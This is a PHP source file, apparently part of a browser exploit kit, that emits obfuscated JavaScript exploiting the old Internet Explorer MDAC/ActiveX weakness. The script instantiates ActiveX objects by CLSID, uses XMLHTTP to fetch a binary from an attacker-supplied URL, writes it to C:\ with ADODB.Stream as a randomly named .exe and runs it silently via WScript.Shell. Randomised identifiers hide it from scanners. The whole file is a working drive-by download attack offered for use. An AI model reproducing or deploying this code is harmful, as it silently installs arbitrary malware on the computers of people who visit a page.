<?php
	function ie6_mdac(){
	GLOBAL $url, $rnd_var, $rnd_str;
?>
<script language="JavaScript">
	
	function <?=$rnd_var[1];?>(<?=$rnd_var[7];?>)
	{
		var <?=$rnd_var[2];?> = <?=rnd_str("abcdefghiklmnopqrstuvwxyz");?>;
		var <?=$rnd_var[3];?> = <?=$rnd_var[7];?>;
		var <?=$rnd_var[4];?> = '';
		for (var i=0; i<<?=$rnd_var[3];?>; i++)
		{
			var <?=$rnd_var[5];?> = Math.floor(Math.random() * <?=$rnd_var[2];?>.length);
			<?=$rnd_var[4];?> += <?=$rnd_var[2];?>.substring(<?=$rnd_var[5];?>,<?=$rnd_var[5];?>+1);
		}
		return <?=$rnd_var[4];?>;
	}
	
	function <?=$rnd_var[6];?>(<?=$rnd_var[14];?>, <?=$rnd_var[15];?>)
	{
		var <?=$rnd_var[16];?> = null;
		
		                try { eval('<?=$rnd_var[16];?> = <?=$rnd_var[14];?>.CreateObject(<?=$rnd_var[15];?>)') }         catch(e){}
		if (! <?=$rnd_var[16];?>) { try { eval('<?=$rnd_var[16];?> = <?=$rnd_var[14];?>.CreateObject(<?=$rnd_var[15];?>, "")') }     catch(e){} }
		if (! <?=$rnd_var[16];?>) { try { eval('<?=$rnd_var[16];?> = <?=$rnd_var[14];?>.CreateObject(<?=$rnd_var[15];?>, "", "")') } catch(e){} }
		if (! <?=$rnd_var[16];?>) { try { eval('<?=$rnd_var[16];?> = <?=$rnd_var[14];?>.GetObject("", <?=$rnd_var[15];?>)') }        catch(e){} }
		if (! <?=$rnd_var[16];?>) { try { eval('<?=$rnd_var[16];?> = <?=$rnd_var[14];?>.GetObject(<?=$rnd_var[15];?>, "")') }        catch(e){} }
		if (! <?=$rnd_var[16];?>) { try { eval('<?=$rnd_var[16];?> = <?=$rnd_var[14];?>.GetObject(<?=$rnd_var[15];?>)') }            catch(e){} }
		
		return(<?=$rnd_var[16];?>);
	}
	
	function <?=$rnd_var[8];?>(<?=$rnd_var[17];?>, <?=$rnd_var[18];?>)
	{
		try
		{
			<?=$rnd_var[17];?>.open(<?=rnd_str("GET");?>, <?=$rnd_var[18];?>, false);
			<?=$rnd_var[17];?>.send(null);
		} catch(e) { return 0; }
			
		return <?=$rnd_var[17];?>.responseBody;
	}
	
	function <?=$rnd_var[9];?>(<?=$rnd_var[21];?>, <?=$rnd_var[19];?>, <?=$rnd_var[20];?>)
	{
		try
		{
			<?=$rnd_var[21];?>.Type = 1;
			<?=$rnd_var[21];?>.Mode = 3;
			<?=$rnd_var[21];?>.Open();
			<?=$rnd_var[21];?>.Write(<?=$rnd_var[20];?>);
			<?=$rnd_var[21];?>.SaveToFile(<?=$rnd_var[19];?>, 2);
			<?=$rnd_var[21];?>.Close();
		} catch(e) { return 0; }
		return 1;
	}
	
	function <?=$rnd_var[10];?>(<?=$rnd_var[22];?>, <?=$rnd_var[23];?>, <?=$rnd_var[24];?>)
	{
		if (<?=$rnd_var[24];?> == 0)
		{
			try { <?=$rnd_var[22];?>.Run(<?=$rnd_var[23];?>, 0); return 1; } catch(e) { }
		}
		else
		{
			try { exe.<?=$rnd_var[10];?>(<?=$rnd_var[23];?>); return 1; } catch(e) { }
		}
		return(0);
	}
	
	function <?=$rnd_var[25];?>()
	{
		var <?=$rnd_var[11];?> = "<?=$url;?>";
		var <?=$rnd_var[12];?> = new Array(<?=rnd_str("{BD96C556-65A3-11D0-983A-00C04FC29E30}");?>, <?=rnd_str("{BD96C556-65A3-11D0-983A-00C04FC29E36}");?>, <?=rnd_str("{AB9BCEDD-EC7E-47E1-9322-D4A210617116}");?>, <?=rnd_str("{0006F033-0000-0000-C000-000000000046}");?>, <?=rnd_str("{0006F03A-0000-0000-C000-000000000046}");?>, <?=rnd_str("{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}");?>, <?=rnd_str("{6414512B-B978-451D-A0D8-FCFDF33E833C}");?>, <?=rnd_str("{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}");?>, <?=rnd_str("{06723E09-F4C2-43c8-8358-09FCD1DB0766}");?>, <?=rnd_str("{639F725F-1B2D-4831-A9FD-874847682010}");?>, <?=rnd_str("{BA018599-1DB3-44f9-83B4-461454C84BF8}");?>, <?=rnd_str("{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}");?>, <?=rnd_str("{E8CCCDDF-CA28-496b-B050-6C07C962476B}");?>, null);
		var <?=$rnd_var[13];?> = new Array(null, null, null);
		var i = 0;
		var n = 0;
		var ret = 0;
		
		while (<?=$rnd_var[12];?>[i] && (! <?=$rnd_var[13];?>[0] || ! <?=$rnd_var[13];?>[1] || ! <?=$rnd_var[13];?>[2]) )
		{
			var a = null;
			
			try
			{
				a = document.createElement(<?=rnd_str("object");?>);
				a.setAttribute(<?=rnd_str("classid");?>, <?=rnd_str("clsid:");?> + <?=$rnd_var[12];?>[i].substring(1, <?=$rnd_var[12];?>[i].length - 1));
			} catch(e) { a = null; }
				
			if (a)
			{
				if (! <?=$rnd_var[13];?>[0])
				{
					<?=$rnd_var[13];?>[0] = <?=$rnd_var[6];?>(a, <?=rnd_str("msxml2.XMLHTTP");?>);
					if (! <?=$rnd_var[13];?>[0]) <?=$rnd_var[13];?>[0] = <?=$rnd_var[6];?>(a, <?=rnd_str("Microsoft.XMLHTTP");?>);
					if (! <?=$rnd_var[13];?>[0]) <?=$rnd_var[13];?>[0] = <?=$rnd_var[6];?>(a, <?=rnd_str("MSXML2.ServerXMLHTTP");?>);
				}
				if (! <?=$rnd_var[13];?>[1])
				{
					<?=$rnd_var[13];?>[1] = <?=$rnd_var[6];?>(a, <?=rnd_str("ADODB.Stream");?>);
				}
				if (! <?=$rnd_var[13];?>[2])
				{
					<?=$rnd_var[13];?>[2] = <?=$rnd_var[6];?>(a, <?=rnd_str("WScript.Shell");?>);
					if (! <?=$rnd_var[13];?>[2])
					{
						<?=$rnd_var[13];?>[2] = <?=$rnd_var[6];?>(a, <?=rnd_str("Shell.Application");?>);
						if (<?=$rnd_var[13];?>[2]) n=1;
					}
				}
			}
			i++;
		}
		if (<?=$rnd_var[13];?>[0] && <?=$rnd_var[13];?>[1] && <?=$rnd_var[13];?>[2])
		{
			var data = <?=$rnd_var[8];?>(<?=$rnd_var[13];?>[0], <?=$rnd_var[11];?>);
			
			if (data != 0)
			{
				var name = "c:\\"+<?=$rnd_var[1];?>(4)+".exe";
				if (<?=$rnd_var[9];?>(<?=$rnd_var[13];?>[1], name, data) == 1)
				{
					if (<?=$rnd_var[10];?>(<?=$rnd_var[13];?>[2], name, n) == 1) { ret=1; }
				}
			}
		}
		return ret;
	}
	
		<?=$rnd_var[25];?>();

</script>
<?php } ?>